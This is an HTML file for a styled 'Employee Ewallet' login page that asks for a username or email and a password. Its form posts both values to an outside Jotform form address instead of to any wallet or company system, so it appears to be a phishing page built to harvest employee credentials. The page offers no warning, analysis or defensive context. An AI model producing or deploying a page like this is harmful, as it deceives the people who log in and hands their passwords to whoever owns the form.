ail<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Employee Ewallet Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      background-color: #eef2f7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background-color: #ffffff;
      padding: 2.5em;
      width: 320px;
      border-radius: 10px;
      box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.15);
    }

    h2 {
      text-align: center;
      margin-bottom: 1.5em;
      color: #333;
      font-size: 24px;
      font-weight: bold;
    }

    label {
      margin-top: 1em;
      font-size: 14px;
      color: #555;
      display: block;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 0.5em;
      margin-top: 0.5em;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 0.7em;
      background-color: #2b78e4;
      border: none;
      border-radius: 5px;
      color: #fff;
      font-size: 18px;
      margin-top: 1.5em;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #2365c7;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h2>Employee Ewallet</h2>
    <form action="https://app.jotform.com/242707128452859" method="post">
      <label for="username">Username or Email </label>
      <input type="text" id="username" name="username" required>
      
      <label for="password">Password</label>
      <input type="password" id="password" name="password" required>
      
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
